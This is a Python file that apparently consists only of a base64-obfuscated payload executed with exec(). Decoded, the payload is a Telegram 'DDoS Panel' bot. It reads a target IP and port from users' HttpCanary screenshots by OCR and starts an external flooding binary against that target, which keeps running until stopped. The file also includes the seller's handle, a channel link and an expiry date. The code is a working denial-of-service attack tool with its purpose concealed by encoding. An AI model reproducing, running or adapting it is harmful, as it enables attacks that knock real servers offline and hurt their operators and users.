import base64
exec(base64.b64decode('''aW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQgc3lzCmltcG9ydCBzaWduYWwKaW1wb3J0IHN1YnByb2Nlc3MKZnJvbSBpbyBpbXBvcnQgQnl0ZXNJTwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIFBJTCBpbXBvcnQgSW1hZ2UKaW1wb3J0IHB5dGVzc2VyYWN0CmZyb20gdGVsZWdyYW0gaW1wb3J0IFVwZGF0ZSwgUmVwbHlLZXlib2FyZE1hcmt1cCwgS2V5Ym9hcmRCdXR0b24sIFJlcGx5S2V5Ym9hcmRSZW1vdmUKZnJvbSB0ZWxlZ3JhbS5leHQgaW1wb3J0IEFwcGxpY2F0aW9uLCBDb21tYW5kSGFuZGxlciwgTWVzc2FnZUhhbmRsZXIsIGZpbHRlcnMsIENvbnRleHRUeXBlcwpmcm9tIGNvbmZpZyBpbXBvcnQgVEVMRUdSQU1fQk9UX1RPS0VOCgpzZWxlY3RlZF90YXJnZXQgPSB7fQphdHRhY2tfcHJvY2VzcyA9IE5vbmUKCmltcG9ydCBweXRlc3NlcmFjdApmcm9tIFBJTCBpbXBvcnQgSW1hZ2UKCiMgSU1QT1JUQU5UOiBTZXQgdGVzc2VyYWN0IHBhdGgKcHl0ZXNzZXJhY3QucHl0ZXNzZXJhY3QudGVzc2VyYWN0X2NtZCA9ICIvdXNyL2Jpbi90ZXNzZXJhY3QiCgojIPCfkqMgRml4ZWQgSW5mbyAoc2FmZSBpbnNpZGUgZGFrdS5weSkKT1dORVJfVVNFUk5BTUUgPSAnQERBUklOREF4T1dORVInCkNIQU5ORUxfTElOSyA9ICdodHRwczovL3QubWUvKzc0NHBpZnV2dy1vMVpUSTknCkVYUElSWV9EQVRFID0gZGF0ZXRpbWUoMjAyNSwgNywgMjgpCgpkZWYgY2hlY2tfZXhwaXJ5KCk6CiAgICBpZiBkYXRldGltZS5ub3coKSA+IEVYUElSWV9EQVRFOgogICAgICAgIHByaW50KGYi4p2MIFRoaXMgYm90IGhhcyBleHBpcmVkLiBKb2luIHtPV05FUl9VU0VSTkFNRX0gdG8gZ2V0IGEgbmV3IHZlcnNpb24uIikKICAgICAgICBzeXMuZXhpdCgpCgpkZWYgd2VsY29tZV9iYW5uZXIoKToKICAgIGJhbm5lciA9IGYiIiIK4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACvCflKUgV0VMQ09NRSBUTyBEQVJJTkRBIFZJUCBUT09MIPCflKUKCvCfkqMgUHJlbWl1bSBERE9TIFBhbmVsIPCfkqMK8J+UkiBTZWN1cmUgQWNjZXNzIE9ubHkK8J+RkSBPd25lcjoge09XTkVSX1VTRVJOQU1FfQoK8J+ToiBKb2luIG91ciBjaGFubmVsOgrinqHvuI8ge0NIQU5ORUxfTElOS30K4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiIiIgogICAgcHJpbnQoYmFubmVyKQoKZGVmIGV4dHJhY3RfaXBfcG9ydF9mcm9tX2ltYWdlKGltYWdlOiBJbWFnZS5JbWFnZSk6CiAgICB0ZXh0ID0gcHl0ZXNzZXJhY3QuaW1hZ2VfdG9fc3RyaW5nKGltYWdlKQogICAgbWF0Y2hlcyA9IHJlLmZpbmRhbGwociIoXGQrXC5cZCtcLlxkK1wuXGQrKVs6XHNdKDEwMFxkKykiLCB0ZXh0KQogICAgaWYgbWF0Y2hlczoKICAgICAgICByZXR1cm4gbWF0Y2hlc1swXVswXSwgaW50KG1hdGNoZXNbMF1bMV0pCiAgICByZXR1cm4gTm9uZSwgTm9uZQoKYXN5bmMgZGVmIHN0YXJ0KHVwZGF0ZTogVXBkYXRlLCBjb250ZXh0OiBDb250ZXh0VHlwZXMuREVGQVVMVF9UWVBFKToKICAgIGF3YWl0IHVwZGF0ZS5tZXNzYWdlLnJlcGx5X3RleHQoCiAgICAgICAgIvCfpJYgKkREb1MgUGFuZWwgQm90IGJ5IERBUklOREF4T1dORVIqXG5cbiIKICAgICAgICAi8J+TuCBQbGVhc2Ugc2VuZCBhIGNsZWFyIEh0dHBDYW5hcnkgc2NyZWVuc2hvdCB0byBhdXRvbWF0aWNhbGx5IGV4dHJhY3QgdGhlIElQIGFuZCBQb3J0IChQb3J0IG11c3Qgc3RhcnQgd2l0aCBgMTAwKipgKS5cblxuIgogICAgICAgICLirIfvuI8gT25jZSB0YXJnZXQgaXMgZGV0ZWN0ZWQsIHVzZSB0aGUgYnV0dG9ucyBiZWxvdyB0byAqc3RhcnQqIG9yICpzdG9wKiB0aGUgYXR0YWNrLlxuXG4iCiAgICAgICAgIl9Ob3RlOiBCdXR0b25zIHdpbGwgYWx3YXlzIHJlbWFpbiB2aXNpYmxlIGZvciBlYXN5IGNvbnRyb2wuXyIsCiAgICAgICAgcGFyc2VfbW9kZT0iTWFya2Rvd24iCiAgICApCgphc3luYyBkZWYgaGFuZGxlX3Bob3RvKHVwZGF0ZTogVXBkYXRlLCBjb250ZXh0OiBDb250ZXh0VHlwZXMuREVGQVVMVF9UWVBFKToKICAgIHBob3RvID0gdXBkYXRlLm1lc3NhZ2UucGhvdG9bLTFdCiAgICBmaWxlID0gYXdhaXQgcGhvdG8uZ2V0X2ZpbGUoKQogICAgaW1hZ2VfYnl0ZXMgPSBhd2FpdCBmaWxlLmRvd25sb2FkX2FzX2J5dGVhcnJheSgpCiAgICBpbWFnZSA9IEltYWdlLm9wZW4oQnl0ZXNJTyhpbWFnZV9ieXRlcykpCgogICAgaXAsIHBvcnQgPSBleHRyYWN0X2lwX3BvcnRfZnJvbV9pbWFnZShpbWFnZSkKCiAgICBpZiBpcCBhbmQgcG9ydDoKICAgICAgICBzZWxlY3RlZF90YXJnZXRbdXBkYXRlLmVmZmVjdGl2ZV9jaGF0LmlkXSA9IChpcCwgcG9ydCkKCiAgICAgICAga2V5Ym9hcmQgPSBbW0tleWJvYXJkQnV0dG9uKCLwn5qAIEF0dGFjayIpLCBLZXlib2FyZEJ1dHRvbigi4puUIFN0b3AiKV1dCiAgICAgICAgcmVwbHlfbWFya3VwID0gUmVwbHlLZXlib2FyZE1hcmt1cChrZXlib2FyZCwgcmVzaXplX2tleWJvYXJkPVRydWUpCgogICAgICAgIGF3YWl0IHVwZGF0ZS5tZXNzYWdlLnJlcGx5X3RleHQoCiAgICAgICAgICAgIGYi8J+OryBUYXJnZXQgRGV0ZWN0ZWQ6XG5ge2lwfTp7cG9ydH1gXG5cbkNob29zZSBhY3Rpb246IiwKICAgICAgICAgICAgcGFyc2VfbW9kZT0iTWFya2Rvd24iLAogICAgICAgICAgICByZXBseV9tYXJrdXA9cmVwbHlfbWFya3VwCiAgICAgICAgKQogICAgZWxzZToKICAgICAgICBhd2FpdCB1cGRhdGUubWVzc2FnZS5yZXBseV90ZXh0KCLinYwgSVAvUG9ydCBub3QgZm91bmQuIFNlbmQgY2xlYXIgc2NyZWVuc2hvdC4iKQoKYXN5bmMgZGVmIGhhbmRsZV9hY3Rpb24odXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOgogICAgZ2xvYmFsIGF0dGFja19wcm9jZXNzCiAgICBjaGF0X2lkID0gdXBkYXRlLmVmZmVjdGl2ZV9jaGF0LmlkCiAgICB0ZXh0ID0gdXBkYXRlLm1lc3NhZ2UudGV4dC5zdHJpcCgpCgogICAgaWYgY2hhdF9pZCBub3QgaW4gc2VsZWN0ZWRfdGFyZ2V0OgogICAgICAgIGF3YWl0IHVwZGF0ZS5tZXNzYWdlLnJlcGx5X3RleHQoIuKdjCBObyB0YXJnZXQgc2VsZWN0ZWQuIikKICAgICAgICByZXR1cm4KCiAgICBpcCwgcG9ydCA9IHNlbGVjdGVkX3RhcmdldFtjaGF0X2lkXQoKICAgIGlmIHRleHQgPT0gIvCfmoAgQXR0YWNrIjoKICAgICAgICBpZiBhdHRhY2tfcHJvY2VzczoKICAgICAgICAgICAgYXdhaXQgdXBkYXRlLm1lc3NhZ2UucmVwbHlfdGV4dCgi4pqg77iPIEFscmVhZHkgcnVubmluZyEiKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgIyBObyBkdXJhdGlvbiBzbyBydW5zIHVudGlsIG1hbnVhbGx5IHN0b3BwZWQKICAgICAgICBwYWNrZXRfc2l6ZSA9IDEwMAogICAgICAgIHRocmVhZHMgPSAxMDAKICAgICAgICBjb21tYW5kID0gWyIuL2JnbWkiLCBpcCwgc3RyKHBvcnQpLCAiOTk5OSIsIHN0cihwYWNrZXRfc2l6ZSksIHN0cih0aHJlYWRzKV0KCiAgICAgICAgYXR0YWNrX3Byb2Nlc3MgPSBzdWJwcm9jZXNzLlBvcGVuKGNvbW1hbmQpCgogICAgICAgIGF3YWl0IHVwZGF0ZS5tZXNzYWdlLnJlcGx5X3RleHQoCiAgICAgICAgICAgIGYi8J+UpSBBdHRhY2sgU3RhcnRlZCFcbvCfjq8gYHtpcH06e3BvcnR9YFxuXG7ij7nvuI8gVXNlIFN0b3AgYnV0dG9uIHRvIGVuZC4iLAogICAgICAgICAgICBwYXJzZV9tb2RlPSJNYXJrZG93biIKICAgICAgICApCgogICAgZWxpZiB0ZXh0ID09ICLim5QgU3RvcCI6CiAgICAgICAgaWYgYXR0YWNrX3Byb2Nlc3MgYW5kIGF0dGFja19wcm9jZXNzLnBvbGwoKSBpcyBOb25lOgogICAgICAgICAgICBvcy5raWxsKGF0dGFja19wcm9jZXNzLnBpZCwgc2lnbmFsLlNJR0lOVCkKICAgICAgICAgICAgYXR0YWNrX3Byb2Nlc3Mud2FpdCgpCiAgICAgICAgICAgIGF0dGFja19wcm9jZXNzID0gTm9uZQogICAgICAgICAgICBhd2FpdCB1cGRhdGUubWVzc2FnZS5yZXBseV90ZXh0KCLinIUgQXR0YWNrIHN0b3BwZWQuIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBhd2FpdCB1cGRhdGUubWVzc2FnZS5yZXBseV90ZXh0KCLihLnvuI8gTm8gcnVubmluZyBhdHRhY2suIikKCmRlZiBtYWluKCk6CiAgICBjaGVja19leHBpcnkoKQogICAgd2VsY29tZV9iYW5uZXIoKQogICAgCiAgICBhcHAgPSBBcHBsaWNhdGlvbi5idWlsZGVyKCkudG9rZW4oVEVMRUdSQU1fQk9UX1RPS0VOKS5idWlsZCgpCiAgICBhcHAuYWRkX2hhbmRsZXIoQ29tbWFuZEhhbmRsZXIoInN0YXJ0Iiwgc3RhcnQpKQogICAgYXBwLmFkZF9oYW5kbGVyKE1lc3NhZ2VIYW5kbGVyKGZpbHRlcnMuUEhPVE8sIGhhbmRsZV9waG90bykpCiAgICBhcHAuYWRkX2hhbmRsZXIoTWVzc2FnZUhhbmRsZXIoZmlsdGVycy5URVhUICYgfmZpbHRlcnMuQ09NTUFORCwgaGFuZGxlX2FjdGlvbikpCiAgICBwcmludCgi8J+kliBCb3QgaXMgcnVubmluZy4uLiIpCiAgICBhcHAucnVuX3BvbGxpbmcoKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQo='''))
